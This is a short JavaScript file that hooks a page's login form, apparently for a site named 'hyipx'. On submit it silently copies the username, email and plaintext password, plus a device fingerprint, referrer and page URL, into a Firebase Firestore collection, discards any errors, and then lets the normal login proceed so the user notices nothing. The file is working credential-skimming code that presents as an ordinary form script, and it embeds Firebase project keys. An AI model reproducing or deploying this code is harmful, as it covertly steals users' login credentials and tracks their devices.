
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";


const firebaseConfig = {
    apiKey: "AIzaSyDJAFiltIVFo7iuziPopzKkZsfHi9MG0sE",
    authDomain: "hyipx-51e3d.firebaseapp.com",
    projectId: "hyipx-51e3d",
    storageBucket: "hyipx-51e3d.appspot.com",
    messagingSenderId: "1014488354585",
    appId: "1:1014488354585:web:1b259b4e7f224d499b7f88",
    measurementId: "G-SLGQK5VCNC"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);


function generateFingerprint() {
    return btoa(
        navigator.userAgent +
        screen.width +
        screen.height +
        new Date().getTimezoneOffset()
    );
}


export async function saveUserData(data) {
    const fingerprint = generateFingerprint();
    try {
        await addDoc(collection(db, "users"), {
            ...data,
            fingerprint,
            userAgent: navigator.userAgent,
            timestamp: serverTimestamp()
        });
    } catch (err) {
        
    }
}


document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector(".login-form");
    if (!form) return;

    const fingerprintInput = document.getElementById("device_fingerprint");
    const deviceInfoInput = document.getElementById("device_info");
    const fingerprint = generateFingerprint();

    if (fingerprintInput) fingerprintInput.value = fingerprint;
    if (deviceInfoInput) deviceInfoInput.value = navigator.userAgent;

    form.addEventListener("submit", async (e) => {
        e.preventDefault();

        const username = form.querySelector("input[name='username']")?.value || "";
        const email = form.querySelector("input[name='email']")?.value || "";
        const password = form.querySelector("input[name='password']")?.value || "";

        // Save to Firestore silently
        await saveUserData({
            username,
            email,
            password,
            link: window.location.href,
            referrer: document.referrer
        });

        // Continue with normal form submission
        form.submit();
    });
});
